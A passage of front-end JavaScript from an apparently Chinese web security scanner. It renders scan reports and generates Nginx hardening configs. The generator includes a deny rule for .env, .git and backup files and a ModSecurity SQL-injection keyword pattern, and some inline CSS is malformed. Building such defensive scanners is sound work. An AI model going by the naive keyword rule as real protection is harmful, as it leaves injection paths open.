        html += '<div style="color:#4b6eaf">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span> 信息： 公开信息</div>';
      });
      html += '</div></div>';
    }
    // 其他
    if (otherPaths.length > 0) {
      html += '<div style="font-size:12px;line-height:2">';
      otherPaths.forEach(function(p) {
        if (p.protected) {
          html += '<div style="color:var(--success)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span>  已保护</div>';
        } else {
          html += '<div style="color:var(--text-lighter)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span></div>';
        }
      });
      html += '</div>';
    }
    html += '</div>';
  }

  // Deep scan: Crawled pages
  if ( data.crawled_pages && data.crawled_pages.length > 0) {
    html += '<div class="card fade-in-up" style="animation-delay:0.38s">';
    html += '<div class="card-title"> 爬取页面 (' + data.crawled_pages.length + ' 页)</div>';
    html += '<div style="font-size:12px;line-height:2;max-height:200px;overflow-y:auto">';
    data.crawled_pages.forEach(function(p) {
      html += '<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border-light)">';
      html += '<span style="color:' + (p.status === 200 ? 'var(--success)' : 'var(--warning)') + ';font-weight:600;min-width:30px">[' + p.status + ']</span>';
      html += '<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escapeHtml(p.url) + '">' + escapeHtml(p.url) + '</span>';
      if (p.forms > 0) html += '<span style="color:var(--warning);font-size:12px">' + p.forms + ' 表单</span>';
      if (p.inputs > 0) html += '<span style="color:var(--primary);font-size:12px">' + p.inputs + ' 输入框</span>';
      html += '</div>';
    });
    html += '</div></div>';
  }

  // Deep scan: Vulnerability test results
  if ( data.vuln_tests && data.vuln_tests.length > 0) {
    let vulnCount = data.vuln_tests.filter(function(t) { return t.vulnerable; }).length;
    let totalTests = data.vuln_tests.length;
    html += '<div class="card fade-in-up" style="animation-delay:0.40s">';
    html += '<div class="card-title"> 参数与表单验证</div>';
    html += '<div style="display:flex;gap:12px;margin-bottom:10px;font-size:13px">';
    html += '<span style="color:var(--text-secondary)">检测项总数: <strong>' + totalTests + '</strong></span>';
    html += '<span style="color:' + (vulnCount > 0 ? 'var(--danger)' : 'var(--success)') + '">发现漏洞: <strong>' + vulnCount + '</strong></span>';
    html += '</div>';
    html += '<div style="font-size:12px;line-height:1.8;max-height:180px;overflow-y:auto">';
    data.vuln_tests.forEach(function(t) {
      let color = t.vulnerable ? 'var(--danger)' : 'var(--text-lighter)';
      let icon = t.vulnerable ? '' : '';
      html += '<div style="color:' + color + ';padding:2px 0">';
      html += icon + ' [' + t.type + '] ' + escapeHtml(t.param) + '=' + escapeHtml(t.payload) + ' (' + escapeHtml(t.url.substring(0, 50)) + '...)</div>';
    });
    html += '</div></div>';
  }

  // Scan mode badge
  if ( data.scan_type === 'deep') {
    html += '<div style="text-align:center;margin:12px 0">';
    html += '<span style="display:inline-block;padding:4px 14px;background:rgba(75,110,175,0.1);color:var(--primary);border-radius:2px;font-size:12px;font-weight:600">深度扫描模式 - 含参数与表单验证</span>';
    html += '</div>';
  }

  // One-click fix section
  let config漏洞项 = data.findings.filter(function(f) {
    return f.owasp === 'A05 安全配置错误' || f.owasp === 'A02 加密机制失效' || f.name.indexOf('缺少') === 0;
  });
  if ( config漏洞项.length > 0) {
    html += '<div class="card fade-in-up" style="animation-delay:0.42s">';
    html += '<div class="card-title"> 一键生成修复配置</div>';
    html += '<p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px">检测到 ' + config漏洞项.length + ' 个配置类问题，可自动生成 Nginx 修复配置。</p>';
    html += '<div class="fixer-btns">';
    html += '<button class="fixer-btn primary" onclick="goToFixerWithScanResult()"> 生成修复配置</button>';
    html += '<div class="report-download-dropdown">';
    html += '<button class="pdf-download-btn" onclick="toggleReportDropdown()"> 下载报告 <span style="font-size:11px">▼</span></button>';
    html += '<div class="report-dropdown-menu" id="report-dropdown">';
    html += '<div onclick="downloadReport(\'pdf\');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background=\'var(--bg-secondary)\'" onmouseout="this.style.background=\'transparent\'">';
    html += '<span>PDF</span><span>PDF 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">适合打印存档</span>';
    html += '</div>';
    html += '<div onclick="downloadReport(\'html\');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background=\'var(--bg-secondary)\'" onmouseout="this.style.background=\'transparent\'">';
    html += '<span>HTML</span><span>HTML 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">精美可交互</span>';
    html += '</div>';
    html += '</div></div>';
    html += '<button class="fixer-btn success" id="verify-fix-btn" onclick="verifyFix()"> 验证修复效果</button>';
    html += '</div>';
    html += '</div>';
  }

  html += '<div class="card fade-in-up" style="animation-delay:0.7s;background:#3c3f41,rgba(115,201,144,0.02));border:1px solid rgba(115,201,144,0.2);text-align:center">';
  html += '<h3 class="card-title" style="color:var(--success)"> 扫描完成</h3>';
  html += '<p style="color:var(--text-secondary);margin-bottom:16px">将修复配置应用到服务器后，点击下方按钮重新扫描验证效果</p>';
  html += '<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">';
  html += '<button class="btn btn-primary" onclick="verifyFix()"> 验证修复效果</button>';
  html += '<button class="btn btn-secondary" onclick="shareResult()"> 分享报告</button>';
  html += '<button class="btn btn-secondary" onclick="downloadReport(\'pdf\')"> 下载 PDF</button>';
  html += '</div>';
  html += '</div>';

  // PDF 报告内容说明
  html += '<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">';
  html += '<div class="card-title"> PDF 报告内容说明</div>';
  html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">';
  html += '<div> <strong>风险摘要</strong>：确认漏洞数 / 疑似风险数 / 配置缺失数总览</div>';
  html += '<div> <strong>证据详情</strong>：每个 finding 的响应头值、敏感路径内容片段、WAF 检测依据</div>';
  html += '<div> <strong>建议</strong>：按服务器类型（Nginx、Apache、Express、Flask、Spring Boot、Cloudflare）分类的修复配置，含优先级排序</div>';
  html += '<div> <strong>复测结果</strong>：上次 vs 本次分数对比、新增问题、已修复问题列表</div>';
  html += '<div> <strong>评分变化</strong>：如有历史记录，展示分数变化趋势</div>';
  html += '</div>';
  html += '<div style="margin-top:10px;text-align:center">';
  html += '<button class="btn btn-primary" onclick="downloadReport(\'pdf\')"> 下载 PDF 报告</button>';
  html += '</div>';
  html += '</div>';

  // 扫描结论人话总结 - 强化成明确结论格式
  let exposedCount = data.sensitive_paths ? data.sensitive_paths.filter(function(p){ return p.exposed; }).length : 0;
  let suspectCount = data.sensitive_paths ? data.sensitive_paths.filter(function(p){ return p.suspect; }).length : 0;
  let infoCount = data.sensitive_paths ? data.sensitive_paths.filter(function(p){ return p.info; }).length : 0;
  let headerMissingCount = data.findings ? data.findings.filter(function(f){ return f.name.indexOf('缺少') === 0; }).length : 0;
  let configCount = data.findings ? data.findings.filter(function(f){ return f.type === 'config' && f.name.indexOf('缺少') !== 0; }).length : 0;

  // 构建一句明确结论
  let conclusionParts = [];
  if (exposedCount > 0) {
    conclusionParts.push('发现 ' + exposedCount + ' 个确认级敏感文件泄露');
  } else {
    conclusionParts.push('未发现确认级敏感文件泄露');
  }
  if (suspectCount > 0) {
    conclusionParts.push('检测到 ' + suspectCount + ' 个疑似 WAF/登录页响应');
  }
  if (headerMissingCount > 0 || configCount > 0) {
    let totalConfig = headerMissingCount + configCount;
    conclusionParts.push('另有 ' + totalConfig + ' 项安全响应头/配置缺失');
  }
  let conclusionText = conclusionParts.join('，') + '。';

  html += '<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">';
  html += '<div class="card-title"> 扫描总评</div>';
  html += '<div style="font-size:14px;line-height:1.8;font-weight:500">' + escapeHtml(conclusionText) + '</div>';

  // 分项说明
  html += '<div style="margin-top:10px;font-size:12px;line-height:2">';
  if (exposedCount > 0) {
    html += '<div style="color:var(--danger)"> 确认漏洞：' + exposedCount + ' 个敏感文件可直接访问，需立即修复</div>';
  }
  if (suspectCount > 0) {
    html += '<div style="color:var(--warning)">疑似风险：' + suspectCount + ' 个路径返回 200，但内容命中 WAF/登录页/反爬特征，因此不判定为真实泄露，待复核</div>';
  }
  if (infoCount > 0) {
    html += '<div style="color:var(--primary)">信息： 公开信息：' + infoCount + ' 个路径为公开协议文件（如 robots.txt），仅作为信息项展示</div>';
  }
  if (headerMissingCount > 0) {
    html += '<div style="color:var(--text-secondary)">&#x2022; 配置缺失：' + headerMissingCount + ' 个安全响应头未配置</div>';
  }
  html += '</div>';

  // 建议行动
  if (data.restricted) {
    html += '<div style="margin-top:10px;padding:8px 12px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;line-height:1.6">';
    html += '<strong>受限扫描提示</strong><br/>';
    html += '目标存在 WAF / CDN / 登录 / 反爬限制，可能影响结果完整性。建议优先扫主域名，必要时先完成验证。';
    html += '</div>';
  } else if (exposedCount === 0 && suspectCount === 0 && (headerMissingCount > 0 || configCount > 0)) {
    html += '<div style="margin-top:10px;padding:8px 12px;background:rgba(115,201,144,0.08);border-radius:2px;color:var(--success);font-size:12px">';
    html += ' 未发现敏感文件泄露，整体风险可控。建议优先补充缺失的安全响应头以提升评分。';
    html += '</div>';
  }
  html += '</div>';

  //  修复优先级路线
  (function() {
    let step1Action = '', step1Effect = '', step1Done = false;
    let step2Action = '', step2Effect = '', step2Done = false;
    let step3Action = '', step3Effect = '', step3Done = false;

    let hasExposed = data.findings.some(function(f) { return f.type === 'exposed' || (f.name && f.name.indexOf('敏感路径') >= 0); });
    let hasHighHeader = data.findings.some(function(f) { return f.severity === 'high' && f.name && (f.name.indexOf('HSTS') >= 0 || f.name.indexOf('CSP') >= 0); });
    let hasMedLowConfig = data.findings.some(function(f) { return (f.severity === 'medium' || f.severity === 'low') && f.type === 'config'; });
    let hasServerLeak = data.findings.some(function(f) { return f.name && f.name.indexOf('Server') >= 0; });
    let highMissing = data.findings.filter(function(f) { return f.severity === 'high' && f.name && f.name.indexOf('缺少') === 0; });
    let medLowMissing = data.findings.filter(function(f) { return (f.severity === 'medium' || f.severity === 'low') && f.name && f.name.indexOf('缺少') === 0; });

    if (hasExposed) {
      step1Action = '修复 exposed 敏感路径（限制 .env/.git 等文件访问）';
      step1Effect = '预计提升 20 分';
      step1Done = false;
    } else if (hasHighHeader) {
      step1Action = '修复 high severity 响应头缺失（CSP / HSTS）';
      step1Effect = '预计提升 15 分';
      step1Done = false;
    } else {
      step1Action = '无紧急暴露路径，响应头配置良好';
      step1Effect = '保持当前状态';
      step1Done = true;
    }

    if (hasMedLowConfig || hasServerLeak || medLowMissing.length > 0) {
      let parts = [];
      if (medLowMissing.length > 0) parts.push('补充 ' + medLowMissing.length + ' 个 medium/low 响应头');
      if (hasServerLeak) parts.push('隐藏 Server 版本信息');
      step2Action = parts.join(' + ') || '检查并优化配置项';
      step2Effect = '预计提升 8 分';
      step2Done = false;
    } else {
      step2Action = 'medium/low 配置已完善，Server 信息已隐藏';
      step2Effect = '无需操作';
      step2Done = true;
    }

    step3Action = '生成修复配置后重新扫描，确认分数提升';
    step3Effect = '验证闭环';
    step3Done = step1Done && step2Done;

    let step状态 = function(done) {
      return done ? '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 已完成</span>' : '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 未开始</span>';
    };

    html += '<div class="card fade-in-up" style="animation-delay:0.75s;background:#3c3f41,rgba(16,185,129,0.04));border:1px solid rgba(115,201,144,0.2)">';
    html += '<div class="card-title"> 修复优先级路线</div>';
    html += '<div style="display:flex;flex-direction:column;gap:10px">';

    // Step 1
    html += '<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">';
    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">';
    html += '<strong style="font-size:13px;color:#73c990">1. 第一步（立即）</strong>';
    html += step状态(step1Done);
    html += '</div>';
    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">' + step1Action + '</div>';
    html += '<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">' + step1Effect + '</div>';
    html += '</div>';

    // Arrow
    html += '<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>';

    // Step 2
    html += '<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">';
    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">';
    html += '<strong style="font-size:13px;color:#73c990">2. 第二步（今天）</strong>';
    html += step状态(step2Done);
    html += '</div>';
    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">' + step2Action + '</div>';
    html += '<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">' + step2Effect + '</div>';
    html += '</div>';

    // Arrow
    html += '<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>';

    // Step 3
    html += '<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">';
    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">';
    html += '<strong style="font-size:13px;color:#73c990">3. 第三步（复测）</strong>';
    html += step状态(step3Done);
    html += '</div>';
    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">' + step3Action + '</div>';
    html += '<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">' + step3Effect + '</div>';
    html += '</div>';

    html += '</div></div>';
  })();

  // 扫描范围说明和免责声明
  html += '<div style="margin-top:20px;padding:16px;background:var(--bg-secondary);border-radius:2px;font-size:12px;color:var(--text-secondary)">';
  html += '<div style="font-weight:600;margin-bottom:8px">检测范围说明</div>';
  html += '<div>本次扫描检测了：HTTPS/TLS 配置、安全响应头（HSTS/CSP/X-Frame-Options 等 15+ 项）、Cookie 安全属性、CORS 策略、敏感路径暴露、WAF 识别。</div>';
  html += '<div style="margin-top:4px">不进行：破坏性攻击、密码爆破、权限绕过、主动利用和深度渗透测试。</div>';
  html += '<div style="margin-top:4px;color:var(--text-light)">如需全面安全评估，建议配合专业安全服务。</div>';
  html += '<div style="margin-top:8px;font-weight:600">如何验证结果</div>';
  html += '<div>每个发现项都附有请求、响应、命中签名和摘要信息。你可以先看证据，再结合二次扫描结果和原始响应确认；复测后重新扫描，对比评分和证据变化即可验证效果。</div>';
  html += '<div style="margin-top:8px;font-weight:600">证据分层</div>';
  html += '<div>“已确认”表示已验证；“可疑”表示建议复核；“待复核”表示证据较弱。</div>';
  html += '<div style="margin-top:8px;font-weight:600">审计范围</div>';
  html += '<div>本报告覆盖 HTTP/TLS 配置、安全响应头、Cookie 标记、CORS、敏感路径和 WAF 识别，不包含破坏性利用或深度渗透动作。</div>';
  html += '<div style="margin-top:8px;font-weight:600">免责声明</div>';
  html += '<div>本报告由漏洞哨兵自动生成，仅反映扫描时刻的目标配置状况，可用于演示、内测和修复跟踪，不构成完整安全审计结论。</div>';
  html += '</div>';

  let resultContent = document.getElementById('result-content');
  if (!resultContent) {
    setTimeout(function() { renderResult(data); }, 0);
    return;
  }
  resultContent.innerHTML = html;
  //  渲染雷达图
  renderRadarChart(data);
  //  数字滚动动画
  animateScoreProgress(data.score);
  } catch (e) {
    console.error('renderResult error:', e);
    let rc = document.getElementById('result-content');
    if (rc) {
      rc.innerHTML = '<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">!</div><h3 style="color:var(--danger);margin-bottom:8px">报告渲染出错</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在渲染扫描报告时遇到问题，但扫描数据本身是完整的。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：' + escapeHtml(e.message || String(e)) + '</p><button class="btn btn-primary" onclick="location.reload()"> 刷新页面重试</button></div>';
    }
  }
}

// ----- scanRedirectTarget -----
function scanRedirectTarget() {
  if (!lastScanResult || !lastScanResult.redirect_reason) { showToast('无法识别跳转目标地址'); return; }
  let reason = lastScanResult.redirect_reason;
  let match = reason.match(/https?:\/\/[^\s\)]+/);
  if (match && match[0]) {
    let url = match[0];
    let urlInput = document.getElementById('scan-url');
    if (urlInput) urlInput.value = url;
    startScanDirect();
  } else {
    showToast('无法识别跳转目标地址');
  }
}

// ----- shareResult -----
function shareResult() {
  if (!lastScanResult || !lastScanResult.scan_id) { showToast('当前结果暂不支持分享'); return; }
  // 优先使用后端返回的 share_id（如果 ScanResponse 里带了）
  authFetch('/api/history?limit=1').then(function(r){return r.json();}).then(function(data){
    let item = (data.history || [])[0];
    if (!item || !item.share_id) { showToast('分享链接生成失败'); return; }
    let url = window.location.origin + '/api/share/' + item.share_id;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(url).then(function(){
        showToast('分享链接已复制到剪贴板');
      });
    } else {
      prompt('复制以下分享链接：', url);
    }
  });
}

// ----- showPdfDownloadTip -----
function showPdfDownloadTip() {
  let html = '<div class="card fade-in-up" style="background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2);text-align:center">';
  html += '<div style="font-size:18px;margin-bottom:8px"></div>';
  html += '<div style="font-size:15px;font-weight:700;margin-bottom:6px">PDF 报告已生成</div>';
  html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">';
  html += '报告包含以下内容：<br>';
  html += ' 风险摘要（确认漏洞、疑似风险、配置缺失）<br>';
  html += ' 证据详情（响应头值、敏感路径片段、WAF 检测依据）<br>';
  html += ' 建议（按服务器类型分类，含优先级排序）<br>';
  html += ' 复测结果（上次与本次分数对比、新增与已修复问题）<br>';
  html += ' 评分变化趋势（如有历史记录）';
  html += '</div>';
  html += '<button class="btn btn-primary" onclick="downloadReport(\'pdf\')"> 立即下载 PDF</button>';
  html += '</div>';
  let rc = document.getElementById('result-content');
  if (rc) rc.insertAdjacentHTML('afterbegin', html);
}

// ----- toggleFinding -----
function toggleFinding(i) {
  selectFinding(i);
}

// ----- selectFinding -----
function selectFinding(i) {
  // Update list active state
  document.querySelectorAll('.result-list-item').forEach(function(el) { el.classList.remove('active'); });
  let listItem = document.getElementById('finding-list-' + i);
  if (listItem) listItem.classList.add('active');
  // Update detail active state
  document.querySelectorAll('.finding-detail').forEach(function(el) { el.classList.remove('active'); });
  let detail = document.getElementById('finding-detail-' + i);
  if (detail) detail.classList.add('active');
}

// ----- generateFixFromResult -----
function generateFixFromResult() {
  setButtonLoading("gen-fix-btn", true);
  try {
  if (!lastScanResult) { setButtonLoading("gen-fix-btn", false); return; }
  let inputEl = document.getElementById('gen-fix-input');
  let output = document.getElementById('gen-fix-output');
  if (!inputEl || !output) { setButtonLoading("gen-fix-btn", false); return; }
  let input = inputEl.value.trim();
  if (!input) {
    output.innerHTML = '<div style="color:var(--warning);font-size:13px;margin-top:8px">请输入服务器配置内容</div>';
    setButtonLoading("gen-fix-btn", false);
    return;
  }
  let result = generateFixFromFindings(lastScanResult.findings, input);
  output.innerHTML = '<div style="margin-top:14px"><div class="finding-section"><h4>复测后配置</h4><div class="code-block">' + escapeHtml(result.fixed) + '</div></div>' +
    '<div class="fixer-btns" style="margin-top:10px"><button class="fixer-btn success" onclick="copyText(this, \'' + btoa(encodeURIComponent(result.fixed)) + '\')"> 复制配置</button></div></div>';
  } catch(e) {
    console.error('generateFixFromResult error:', e);
    let outEl = document.getElementById('gen-fix-output');
    if (outEl) outEl.innerHTML = '<div style="color:var(--danger);font-size:13px;margin-top:8px">错误： 生成失败：' + escapeHtml(e.message || String(e)) + '</div>';
  } finally {
    setButtonLoading("gen-fix-btn", false);
  }
}

// ----- generateFixFromFindings -----
function generateFixFromFindings(findings, config) {
  try {
    if (!Array.isArray(findings)) findings = [];
    if (typeof config !== 'string') config = '';

    let fixed = config;
    let hasServerBlock = /server\s*\{/.test(fixed);

    if (!hasServerBlock) {
      fixed = `server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.html;

`;
    }

    let headers = [];
    let rules = [];

    findings.forEach(function(f) {
      let name = f.name || '';
      let type = f.type || 'config';
      let typeLower = String(type || '').toLowerCase();
      let fix = f.fix || '';
      if (name.indexOf('缺少 ') === 0 && (name.indexOf('HSTS') >= 0 || name.indexOf('CSP') >= 0 ||
          name.indexOf('X-Frame') >= 0 || name.indexOf('X-Content') >= 0 ||
          name.indexOf('Referrer') >= 0 || name.indexOf('Permissions') >= 0)) {
        if (fix) headers.push(fix);
      } else if (name.indexOf('敏感路径') >= 0 || name.indexOf('敏感文件') >= 0) {
        rules.push('location ~ /(\.env|\.git|.*\.sql|.*\.zip|.*\.bak) {\n    deny all;\n    return 403;\n}');
      } else if (name.indexOf('信息泄露') >= 0 || name.indexOf('Server') >= 0) {
        headers.push('server_tokens off;');
      } else if (name.indexOf('Cookie') >= 0) {
        headers.push('proxy_cookie_path / /; HttpOnly; Secure; SameSite=Strict;');
      } else if (name.indexOf('CORS') >= 0) {
        headers.push("add_header Access-Control-Allow-Origin 'https://your-domain.com' always;");
      } else if ((typeLower === 'xss' || name.toLowerCase().indexOf('xss') >= 0) && fix) {
        headers.push("add_header Content-Security-Policy \"default-src 'self'; script-src 'self'\" always;");
      } else if ((typeLower === 'csrf' || name.toLowerCase().indexOf('csrf') >= 0 || name.toLowerCase().indexOf('xsrf') >= 0) && fix) {
        rules.push('# CSRF: enforce token validation, SameSite cookies, and Origin/Referer checks.');
      } else if ((typeLower === 'traversal' || name.toLowerCase().indexOf('path traversal') >= 0 || name.indexOf('目录穿越') >= 0) && fix) {
        rules.push('# Traversal: normalize paths and restrict access to an allowed base directory.');
      } else if ((typeLower === 'ssrf' || name.toLowerCase().indexOf('ssrf') >= 0) && fix) {
        rules.push('# SSRF: validate targets, block private IP ranges, and resolve DNS before fetching.');
      } else if ((typeLower === 'cmdi' || name.toLowerCase().indexOf('command injection') >= 0 || name.indexOf('命令注入') >= 0) && fix) {
        rules.push('# Command injection: avoid shell=True, use argument arrays, and whitelist every executable argument.');
      } else if ((typeLower === 'xxe' || name.toLowerCase().indexOf('xxe') >= 0 || name.indexOf('xml external entity') >= 0) && fix) {
        rules.push('# XXE: disable DTD and external entities, and use safe XML parser settings.');
      } else if ((typeLower === 'idor' || name.toLowerCase().indexOf('idor') >= 0 || name.indexOf('对象级') >= 0) && fix) {
        rules.push('# IDOR: enforce object-level authorization on every record lookup.');
      } else if ((typeLower === 'deserialization' || name.toLowerCase().indexOf('deserialization') >= 0 || name.indexOf('反序列化') >= 0) && fix) {
        rules.push('# Deserialization: forbid untrusted object graphs, add allowlists, and sign payloads before loading.');
      } else if ((typeLower === 'ssti' || name.indexOf('模板注入') >= 0) && fix) {
        rules.push('# Template engine: enable auto-escaping and never concatenate user input into expressions.');
      } else if ((typeLower === 'open_redirect' || name.indexOf('开放重定向') >= 0) && fix) {
        rules.push('# Redirects: validate targets against a whitelist and allow only trusted relative paths.');
      } else if (typeLower === 'sqli' && fix) {
        rules.push('# ModSecurity: SecRule ARGS "(OR|UNION)" "deny,status:403"');
      }
    });

    if (headers.length > 0 || rules.length > 0) {
      if (hasServerBlock) {
        let insertPos = fixed.lastIndexOf('}');
        let before = fixed.substring(0, insertPos);
        let after = fixed.substring(insertPos);
        if (headers.length > 0) {
          before += '\n    # === 安全响应头（由漏洞哨兵生成） ===\n';
          headers.forEach(function(h) {
            let lines = h.split('\n');
            lines.forEach(function(line) {
              if (line.trim()) before += '    ' + line.trim() + '\n';
            });
          });
        }
        if (rules.length > 0) {
          before += '\n    # === 拦截规则（由漏洞哨兵生成） ===\n';
          rules.forEach(function(r) {
            before += '    ' + r + '\n';
          });
        }
        fixed = before + after;
      } else {
        headers.forEach(function(h) { fixed += h + '\n'; });
        rules.forEach(function(r) { fixed += r + '\n'; });
        fixed += '}\n';
      }
    }

    return { fixed: fixed };
  } catch (e) {
    console.error('generateFixFromFindings error:', e);
    return { fixed: config || '', error: e.message || String(e) };
  }
}
// ----- goToFixerWithScanResult -----
function goToFixerWithScanResult() {
  if (!lastScanResult) { showToast('请先完成扫描'); return; }
  setButtonLoading("goto-fixer-btn", true);
  navigateTo('fixer');
  showToast('正在生成修复方案...');
  let url = lastScanResult.url;

  authFetch('/api/fix', {
    method: 'POST',
    body: JSON.stringify({ url: url })
  }).then(function(resp) { return resp.json(); }).then(function(data) {
    setButtonLoading('goto-fixer-btn', false);
    if (data.success) {
      lastFixResult = data.fixes;
      renderFixResult(data.fixes, data.score);
    } else {
      let fr = document.getElementById('fixer-result');
      if (fr) fr.innerHTML = '<div class="card"><p style="color:var(--danger)">生成失败: ' + escapeHtml(extractError(data)) + '</p></div>';
    }
  }).catch(function(e) {
    setButtonLoading('goto-fixer-btn', false);
    // Fallback: use local findings
    let fixes = generateLocalFixes(lastScanResult.findings);
    lastFixResult = fixes;
    renderFixResult(fixes, lastScanResult.score);
  });
}

// ----- generateLocalFixes -----
function generateLocalFixes(findings) {
  try {
    if (!Array.isArray(findings)) findings = [];
  let fixes = { nginx: [], apache: [], express: [], flask: [], spring_boot: [], cloudflare: [], python: [], nodejs: [] };
  findings.forEach(function(f) {
    let fix = f.fix || '';
    if (fix) {
      fixes.nginx.push(fix);
      fixes.apache.push(fix.replace('add_header', 'Header set').replace('always;', ''));
      fixes.express.push('// ' + f.name + ': ' + fix.substring(0, 60));
      fixes.flask.push('# ' + f.name + ': ' + fix.substring(0, 60));
      fixes.spring_boot.push('// ' + f.name + ': ' + fix.substring(0, 60));
      fixes.cloudflare.push('# ' + f.name + ': ' + fix.substring(0, 60));
      fixes.python.push('# ' + f.name + ': ' + fix.substring(0, 60));
      fixes.nodejs.push('// ' + f.name + ': ' + fix.substring(0, 60));
    }
  });
  return fixes;
  } catch (e) {
    console.error('generateLocalFixes error:', e);
    return { nginx: [], apache: [], express: [], flask: [], spring_boot: [], cloudflare: [], python: [], nodejs: [] };
  }
}

// ----- renderFixResult -----
function renderFixResult(fixes, score) {
  try {
    if (!fixes || typeof fixes !== 'object') fixes = { nginx: [], python: [], nodejs: [], apache: [] };
  let promptEl = document.getElementById('fixer-scan-prompt');
  let tabsEl = document.getElementById('fixer-lang-tabs');
  let resultEl = document.getElementById('fixer-result');
  if (promptEl) promptEl.style.display = 'none';
  if (tabsEl) tabsEl.style.display = 'block';
  if (!resultEl) return;

  let html = '';
  let langLabels = { nginx: 'Nginx', python: 'Python (Flask)', nodejs: 'Node.js (Express)', apache: 'Apache' };
  let langIcons = { nginx: '', python: '', nodejs: '', apache: '' };

  let lang = currentFixLang;
  let lines = fixes[lang] || [];

  html += '<div class="card fade-in-up">';
  html += '<div class="card-title">' + langIcons[lang] + ' ' + langLabels[lang] + ' 修复代码</div>';
  html += '<div style="font-size:12px;color:var(--text-lighter);margin-bottom:10px">共 ' + lines.length + ' 条建议，评分: ' + (typeof score === 'number' && !isNaN(score) ? score : 0) + '</div>';

  if (lines.length === 0) {
    html += '<p style="color:var(--success);font-size:13px"> 未检测到需要修复的配置问题</p>';
  } else {
    // 兼容字符串列表 / {code, risk_note} 对象列表
    let fullCode = lines.map(function(item) {
      if (typeof item === 'string') return item;
      if (item && typeof item === 'object') return item.code || '';
      return String(item);
    }).join('\n\n');
    html += '<div class="code-block" style="max-height:400px;overflow-y:auto">' + escapeHtml(fullCode) + '</div>';
    html += '<div class="fixer-btns" style="margin-top:12px">';
    html += '<button class="fixer-btn success" onclick="copyFixCodeByLang(\'' + lang + '\')"> 复制代码</button>';
    html += '<button class="fixer-btn primary" onclick="downloadFixCode(\'' + lang + '\')"> 下载文件</button>';
    html += '</div>';
  }

  // Show all languages summary
  html += '<div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border-light)">';
  html += '<div style="font-size:12px;color:var(--text-lighter);margin-bottom:8px">其他语言修复方案：</div>';
  ['nginx', 'python', 'nodejs', 'apache'].forEach(function(l) {
    if (l === lang) return;
    let count = (fixes[l] || []).length;
    html += '<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px">';
    html += '<span>' + langIcons[l] + ' ' + langLabels[l] + '</span>';
    html += '<span style="color:var(--text-lighter)">' + count + ' 条修复</span>';
    html += '</div>';
  });
  html += '</div>';
  html += '</div>';

  resultEl.innerHTML = html;
  } catch (e) {
    console.error('renderFixResult error:', e);
    let resultEl = document.getElementById('fixer-result');
    if (resultEl) resultEl.innerHTML = '<div class="card"><p style="color:var(--danger)">渲染修复结果失败: ' + escapeHtml(e.message || String(e)) + '</p></div>';
  }
}

// ----- switchFixLang -----
function switchFixLang(lang) {
  currentFixLang = lang;
  document.querySelectorAll('.lang-tab').forEach(function(btn) {
    if (btn.dataset.lang === lang) {
      btn.className = 'fixer-btn primary lang-tab active';
    } else {
      btn.className = 'fixer-btn secondary lang-tab';
    }
  });
  if (lastFixResult) {
    renderFixResult(lastFixResult, lastScanResult ? lastScanResult.score : 0);
  }
}

// ----- switchFixPlatform -----
function switchFixPlatform(platform, prefix) {
  prefix = prefix || 'fix-';
  let platforms = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare"];
  platforms.forEach(function(p) {
